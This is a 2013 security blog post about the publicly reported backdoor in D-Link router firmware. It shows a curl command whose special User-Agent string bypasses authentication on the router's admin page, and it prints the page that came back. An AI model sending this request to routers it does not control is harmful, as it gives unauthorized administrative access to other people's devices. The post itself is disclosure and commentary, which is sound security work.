---
layout: post
title: D-Link Backdoor Fun
date: '2013-10-14T00:24:00.001-06:00'
author: JM
tags: 
modified_time: '2013-10-14T10:38:36.423-06:00'
blogger_id: tag:blogger.com,1999:blog-4063990595241430327.post-5439853457525680456
blogger_orig_url: http://www.pwnage.io/2013/10/d-link-backdoor-fun.html
---

## Uh Oh...

Interestingly enough I was messing around with my D-Link router this weekend and found a number of web application vulnerabilities (I've contacted D-Link but haven't heard back - they'll most likely be busy tomorrow though with this MUCH WORSE "vulnerability"), and [this popped up in my twitter feed](http://www.cso.com.au/article/528993/backdoor_found_d-link_router_firmware_code/). This is a news story regarding [this blog post.](http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/)

So I did:

`curl -A "xmlset_roodkcableoj28840ybtide" http://192.168.0.1/tools_admin.php`

Which returned:

```
<html>
<head>
<meta http-equiv=Content-Type content="no-cache">
<meta http-equiv=Content-Type content="text/html; charset=utf-8">

<title>D-LINK SYSTEMS, INC | WIRELESS ROUTER | HOME</title>
<script>

-snip-

/* parameter checking */
function check()
{
        var f=get_obj("frm");
        if(is_blank(f.admin_name.value))
        {
                alert("Please input the Login Name.");
                f.admin_name.select();
                return false;
        }
        else if(strchk_hostname(f.admin_name.value)==false)
        {
                alert("The Login Name is with invalid character. Please check it.");
                f.admin_name.select();
                return false;
        }
        if(strchk_unicode(f.admin_password1.value)==true)
        {
                alert("The New Password is with invalid character. Please check it.");
                f.admin_password1.select();
                return false;
        }
        if(f.admin_password1.value!=f.admin_password2.value)
        {
                alert("The New Password and Confirm Password are not matched.");
                f.admin_password1.select();
                return false;
        }

-snip-        
```

Well that's not good. Full authentication bypass.

Something funny that I found in the comments of the Reddit /r/netsec thread:

```
$ ruby -e 'puts "xmlset_roodkcableoj28840ybtide".reverse'
editby04882joelbackdoor_teslmx
```

Well, if Joel's still around I'm not sure how much longer he'll be at his job. Damn...

Update: There has been some speculation that this backdoor is merely functionality: [http://pastebin.com/aMz8eYGa](http://pastebin.com/aMz8eYGa)
